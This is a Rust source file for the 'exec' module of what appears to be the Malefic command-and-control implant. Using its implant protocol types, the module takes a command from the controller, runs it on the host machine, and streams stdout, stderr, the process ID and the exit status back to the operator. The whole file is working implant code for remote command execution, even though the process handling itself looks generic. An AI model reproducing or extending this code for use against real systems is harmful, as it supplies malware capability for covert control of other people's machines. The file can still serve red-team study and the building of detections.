use crate::{check_request, Module, TaskResult};
use async_trait::async_trait;
use futures::{AsyncReadExt, FutureExt, SinkExt};
use futures::channel::mpsc::{self, UnboundedReceiver, UnboundedSender};
use futures_timer::Delay;
use malefic_helper::common::process::{async_command, run_command};
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::modulepb::ExecResponse;
use malefic_trait::module_impl;
use std::time::Duration;

pub struct Exec {}

#[derive(Debug)]
enum OutputData {
    Stdout(Vec<u8>),
    Stderr(Vec<u8>),
}

// 异步读取管道数据并发送到 channel
async fn read_pipe_async<R: AsyncReadExt + Unpin + Send>(
    mut reader: R,
    sender: UnboundedSender<OutputData>,
    is_stdout: bool,
) {
    let mut buffer = vec![0; 4096];

    loop {
        match reader.read(&mut buffer).await {
            Ok(0) => break, // EOF
            Ok(n) => {
                let data = buffer[..n].to_vec();
                let output = if is_stdout {
                    OutputData::Stdout(data)
                } else {
                    OutputData::Stderr(data)
                };

                if sender.unbounded_send(output).is_err() {
                    break; // Channel 已关闭
                }
            }
            Err(_) => break, // 读取错误
        }
    }
}



#[async_trait]
#[module_impl("exec")]
impl Module for Exec {}

#[async_trait]
impl crate::ModuleImpl for Exec {
    #[allow(unused_variables)]
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        sender: &mut crate::Output,
    ) -> crate::Result {
        let request = check_request!(receiver, Body::ExecRequest)?;
        let mut exec_response = ExecResponse::default();

        if request.realtime && request.output {
            let mut child = async_command(request.path, request.args)?;
            let stdout = child.stdout.take().unwrap();
            let stderr = child.stderr.take().unwrap();
            let pid = child.id();

            let (sender_ch, mut receiver_ch) = mpsc::unbounded::<OutputData>();
            let stdout_task = read_pipe_async(stdout, sender_ch.clone(), true);
            let stderr_task = read_pipe_async(stderr, sender_ch, false);
            let background_task = async { futures::join!(stdout_task, stderr_task); }.fuse();
            futures::pin_mut!(background_task);
            
            let collect_data = |receiver: &mut UnboundedReceiver<OutputData>| -> (Vec<u8>, Vec<u8>) {
                let (mut stdout_data, mut stderr_data) = (Vec::new(), Vec::new());
                while let Ok(Some(data)) = receiver.try_next() {
                    match data {
                        OutputData::Stdout(data) => stdout_data.extend_from_slice(&data),
                        OutputData::Stderr(data) => stderr_data.extend_from_slice(&data),
                    }
                }
                (stdout_data, stderr_data)
            };
            
            loop {
                futures::select! {
                    _ = Delay::new(Duration::from_secs(1)).fuse() => {
                        let (stdout_data, stderr_data) = collect_data(&mut receiver_ch);

                        if !stdout_data.is_empty() || !stderr_data.is_empty() {
                            let response = ExecResponse {
                                pid,
                                stdout: stdout_data,
                                stderr: stderr_data,
                                end: false,
                                ..Default::default()
                            };
                            sender.send(TaskResult::new_with_body(id, Body::ExecResponse(response))).await?;
                        }
                    }
                    _ = background_task => {
                        let (stdout_data, stderr_data) = collect_data(&mut receiver_ch);
                        let status_code = child.try_status().ok().flatten().map(|s| s.code().unwrap_or(0)).unwrap_or(-1);

                        let response = ExecResponse {
                            pid,
                            stdout: stdout_data,
                            stderr: stderr_data,
                            status_code,
                            ..Default::default()
                        };
                        sender.send(TaskResult::new_with_body(id, Body::ExecResponse(response))).await?;
                        break;
                    }
                }
            }
        } else {
            let child = run_command(request.path, request.args)?;
            exec_response.pid = child.id();
            let output = child.wait_with_output()?;

            exec_response.status_code = output.status.code().unwrap_or(0);
            if request.output {
                exec_response.stdout = output.stdout;
                exec_response.stderr = output.stderr;
            }
        }

        exec_response.end = true;
        Ok(TaskResult::new_with_body(
            id,
            Body::ExecResponse(exec_response),
        ))
    }
}
